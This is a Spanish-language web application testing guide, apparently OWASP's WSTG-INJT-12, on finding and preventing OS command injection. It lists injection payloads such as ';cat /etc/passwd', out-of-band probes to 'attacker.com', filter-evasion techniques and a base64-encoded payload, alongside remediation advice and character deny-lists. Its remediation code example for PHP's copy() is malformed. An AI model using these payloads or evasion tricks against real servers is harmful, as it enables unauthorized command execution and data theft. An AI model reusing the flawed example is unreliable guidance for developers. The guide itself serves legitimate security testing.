Inyección de comandos

ID
WSTG-INJT-12

Resumen

Este artículo describe cómo probar una aplicación en busca de inyección de comandos del sistema operativo. El evaluador intentará inyectar un comando del sistema operativo mediante una petición HTTP a la aplicación.

La inyección de comandos del sistema operativo es una vulnerabilidad que se produce cuando la entrada del usuario se pasa directamente a un comando del sistema operativo sin la debida validación o saneamiento. Esto permite al usuario inyectar y ejecutar comandos arbitrarios en el servidor, lo que puede conducir a acceso no autorizado a datos, corrupción de datos y compromiso total del servidor. Esta vulnerabilidad se puede prevenir dando prioridad a la seguridad durante el diseño y el desarrollo de las aplicaciones.

Objetivos de la prueba

  • Identificar y evaluar los puntos de inyección de comandos.
  • Eludir los filtros de caracteres especiales y de comandos del sistema operativo.

Cómo probar

Al visualizar un archivo en una aplicación web, el nombre del archivo suele aparecer en la URL. Perl permite canalizar datos de un proceso hacia una sentencia open. El usuario puede simplemente añadir el símbolo de tubería (pipe) | al final del nombre del archivo.

Ejemplo de URL antes de la alteración:

https://sensitive/cgi-bin/userData.pl?doc=user1.txt

Ejemplo de URL modificada:

https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls

Esto ejecutará el comando /bin/ls.

Añadir un punto y coma al final de la URL de una página .PHP seguido de un comando del sistema operativo ejecutará el comando. %3B es la codificación URL del punto y coma.

Ejemplo:

https://sensitive/something.php?dir=%3Bcat%20/etc/passwd

Caracteres especiales para la inyección de comandos

Los caracteres especiales se utilizan para encadenar varios comandos. Estos caracteres varían según el sistema operativo que ejecuta el servidor web. Por ejemplo, los siguientes tipos de encadenamiento de comandos se pueden usar tanto en sistemas Windows como en sistemas basados en Unix:

  • cmd1|cmd2 : cmd2 se ejecutará tenga éxito o no cmd1.
  • cmd1||cmd2 : cmd2 solo se ejecutará si cmd1 falla.
  • cmd1&&cmd2 : cmd2 solo se ejecutará si cmd1 tiene éxito.
  • cmd1&cmd2 : cmd2 se ejecutará tenga éxito o no cmd1.

El punto y coma ; funcionará en sistemas basados en Unix y en PowerShell. Sin embargo, no funcionará en el Símbolo del sistema de Windows (CMD).
Además, se puede usar la sustitución de comandos de Bash $(cmd) o `cmd` para ejecutar comandos en sistemas basados en Unix.
Adicionalmente, también se pueden usar descriptores de archivo de Linux como >(cmd), <(cmd).

Técnicas adicionales de inyección de comandos

Los atacantes pueden aprovechar diferentes técnicas para ejecutar comandos del sistema operativo según el entorno y los mecanismos de filtrado.

Sustitución de comandos

La sustitución de comandos permite que la salida de un comando se utilice como entrada de otro comando.

Ejemplos:

$(whoami)
`whoami`

Encadenamiento de comandos

Se pueden ejecutar varios comandos de forma secuencial utilizando operadores de encadenamiento de comandos.

Ejemplos:

cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2

Redirección a archivos

Los atacantes pueden redirigir la salida de un comando a archivos accesibles por el servidor web.

Ejemplo:

whoami > /var/www/html/output.txt

Inyección de comandos fuera de banda (Out-of-Band)

Los atacantes pueden usar servicios externos para detectar la ejecución de comandos.

Ejemplos:

curl http://attacker.com
nslookup attacker.com

Evasión de filtros

Para prevenir la inyección de comandos del sistema operativo, los desarrolladores web suelen usar filtros. Sin embargo, estos filtros a veces no se implementan correctamente, lo que permite a los atacantes eludirlos. En esta sección cubriremos diferentes técnicas utilizadas para eludir esos filtros.

Metodología

En primer lugar, siempre es una buena práctica tener una comprensión básica de cómo funciona el filtro antes de intentar eludirlo. Esta es una metodología que podemos usar cuando nos encontramos con un filtro:

  • ¿El filtro es del lado del cliente o del lado del servidor?
  • ¿El filtro se aplica a caracteres especiales, a comandos del sistema operativo o a ambos?
  • ¿La aplicación web usa un filtro de lista de permitidos (allowlist) o de lista de bloqueados (blocklist)?
  • ¿Qué sistema operativo ejecuta el servidor web? Esto nos da una idea de los comandos y caracteres especiales que podemos usar.

Evasión de filtros de caracteres especiales

Como se mencionó anteriormente, los filtros pueden aplicarse a caracteres especiales, a comandos del sistema operativo o a ambos. Para eludir los filtros aplicados a caracteres especiales, podemos usar variables de entorno, la expansión de llaves de Bash o la codificación URL.

Codificación URL

Codificar en URL los caracteres especiales puede permitirnos eludir el filtro si el servidor web solo bloquea los caracteres especiales en texto plano. Estos son algunos caracteres especiales con su formato codificado en URL:

Carácter especial Codificación URL
; %3b
espacio %20
tabulador %09
& %26
Nueva línea %0a

Por ejemplo, en lugar de usar ;whoami, podríamos usar %3bwhoami.

Variables de entorno

Los caracteres especiales como el espacio, el punto y coma, el tabulador o la nueva línea generalmente serán filtrados por el servidor web, especialmente si no son útiles para la entrada especificada.
Para escapar de esta restricción, podemos usar variables de entorno como IFS, PATH o LS_COLORS en Linux, y HOMEPATH en Windows.
Por ejemplo, en Linux, /, ; y [espacio] pueden reemplazarse respectivamente por ${PATH:0:1}, ${LS_COLORS:10:1} y ${IFS}.
En Windows CMD, podemos reemplazar \ por %HOMEPATH:~6,1%, o usar $env:HOMEPATH[0] en PowerShell.

Expansión de llaves de Bash

La expansión de llaves de Bash (brace expansion) es una funcionalidad de Bash que permite ejecutar comandos utilizando llaves.
Por ejemplo, {ls,-la} ejecutará el comando ls -la. Esto puede ser extremadamente útil si el servidor web filtra los caracteres de espacio, nueva línea o tabulador.
Supongamos que queremos mostrar el contenido del archivo '/etc/passwd'. Entonces, en lugar de usar ;cat /etc/passwd, podemos usar ;{cat,/etc/passwd}. Dicho esto, es importante tener en cuenta que esta técnica solo funcionará si el servidor web utiliza Bash y si caracteres como }{/,; no están filtrados.

Evasión de filtros de comandos

En esta sección vamos a explorar algunas técnicas utilizadas para eludir los filtros aplicados a comandos del sistema operativo.

Modificación de mayúsculas y minúsculas

La modificación de mayúsculas y minúsculas es una técnica que se utiliza para eludir los filtros de comandos del sistema operativo. Será útil si el filtro del lado del servidor distingue entre mayúsculas y minúsculas.
Por ejemplo, si durante nuestras pruebas notamos que el servidor web bloquea ;whoami, podemos intentar usar en su lugar ;WhoAmi; si vemos que el filtro del lado del servidor solo bloquea los comandos en minúsculas, podremos eludirlo.
Esta técnica generalmente funcionará en sistemas Windows.
En Linux, usaremos una técnica llamada desplazamiento de caracteres (character shifting). Por ejemplo, el siguiente comando traducirá cada carácter en mayúscula a su correspondiente carácter en minúscula. 

;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")

Inserción de caracteres

Caracteres como \; $@, ' pueden insertarse en comandos del sistema operativo Linux sin afectar la ejecución normal del comando.
Por ejemplo, who\ami, w$@hoami o wh'o'ami ejecutarán todos el comando whoami.

Nota: el número de comillas simples ' en el comando de Linux debe ser par, de lo contrario se obtendrá un error. Si se usa Windows CMD, asegúrese de usar comillas dobles " en su lugar.
Además, también se puede usar un acento circunflejo ^ en comandos de CMD. Por ejemplo, whoa^mi ejecutará el comando whoami. Esto no funciona en PowerShell.

Codificación Base64

En ciertos escenarios, el servidor web puede filtrar comandos como whoami, id, etc.
Supongamos que el servidor web bloquea whoami. Por lo tanto, no podemos usar un payload como ;whoami.
Para eludir esta restricción, usaremos el formato codificado en base64 de whoami ejecutando: echo -n 'whoami' | base64. Esto devolverá d2hvYW1p. Después de eso, enviaremos el siguiente payload: ;bash<<<$(base64 -d<<< d2hvYW1p) en el parámetro vulnerable. Esto debería eludir el filtro del lado del servidor y permitirnos lograr la ejecución remota de comandos.

Finalmente, tenga en cuenta que es posible que sea necesario combinar diferentes técnicas de evasión de filtros de caracteres especiales y de comandos del sistema operativo para eludir con éxito los filtros implementados por el servidor web.

Inyección de comandos a ciegas (Blind)

A veces, es posible que no podamos ver la salida de nuestro comando inyectado en la respuesta HTTP del servidor web. Por lo tanto, necesitaremos encontrar una forma de confirmar si nuestra inyección tuvo éxito o no. Para ello, podemos usar servidores remotos HTTP, DNS o SMTP bajo nuestro control.
También podemos usar comandos del sistema con retardo de tiempo como sleep (Linux), timeout (Windows), o una utilidad de red como ping.
Por ejemplo, podemos ejecutar ;sleep(5) y, si el servidor web espera 5 segundos antes de enviarnos una respuesta, podemos confirmar que es vulnerable a una inyección de comandos a ciegas.
Además, también podemos redirigir la salida del comando inyectado a la raíz web del servidor web. ;whoami>/var/www/html/poc.txt;
Después de eso, podemos ejecutar curl http://website.com/poc.txt. Si logramos recuperar el archivo, podemos confirmar que el servidor web es vulnerable a una inyección de comandos a ciegas.

APIs peligrosas de ejecución de comandos

Las siguientes APIs de distintos lenguajes de programación pueden ejecutar comandos del sistema operativo y pueden introducir vulnerabilidades de inyección de comandos si se utilizan con entradas de usuario sin sanear.

Lenguaje APIs peligrosas
Java Runtime.exec()
C/C++ system(), exec(), ShellExecute()
Python exec(), eval(), os.system(), os.popen(), subprocess.Popen(), subprocess.call()
PHP system(), shell_exec(), exec(), proc_open(), eval(), passthru()
Node.js child_process.exec(), execSync(), spawn()
Ruby system(), exec(), Open3.popen3()
Go exec.Command()
C# Process.Start()

Corrección

Saneamiento

Los parámetros de consulta de la URL y los datos de formularios deben validarse y sanearse para evitar la inyección de caracteres maliciosos.
Una lista de bloqueo (blocklist) de caracteres es una opción, pero puede ser difícil pensar en todos los caracteres contra los que validar. Además, puede haber algunos que aún no se hayan descubierto.
Se debe crear una lista de permitidos (allowlist) que contenga únicamente los caracteres o comandos autorizados para validar la entrada del usuario. Los caracteres que se hayan pasado por alto, así como las amenazas aún no descubiertas, deben ser eliminados por esta lista.

Una lista de denegación general para incluir en la prevención de la inyección de comandos puede ser | ; & $ > < ' \ ! >> #

Escapar o filtrar los caracteres especiales para Windows, ( ) < > & * ‘ | = ? ; [ ] ^ ~ ! . " % @ / \ : + , `

Escapar o filtrar los caracteres especiales para Linux, { } ( ) > < & * ‘ | = ? ; [ ] $ - # ~ ! . " % / \ : + , `

Además, evite usar funciones que ejecuten comandos del sistema operativo en su aplicación a menos que sea absolutamente necesario. Por ejemplo, en lugar de usar system("cp /path/to/file1.txt /path/to/file2.txt") para copiar un archivo, puede usar directamente la función integrada de php copy("cp /path/to/file1.txt, /path/to/file2.txt"), que hace exactamente lo mismo. Vale la pena señalar que otros lenguajes/frameworks de desarrollo generalmente ofrecen funcionalidad integrada similar.

Permisos

La aplicación web y sus componentes deben ejecutarse con permisos estrictos que no permitan la ejecución de comandos del sistema operativo. Intente verificar toda esta información para probar desde el punto de vista de las pruebas de caja gris.
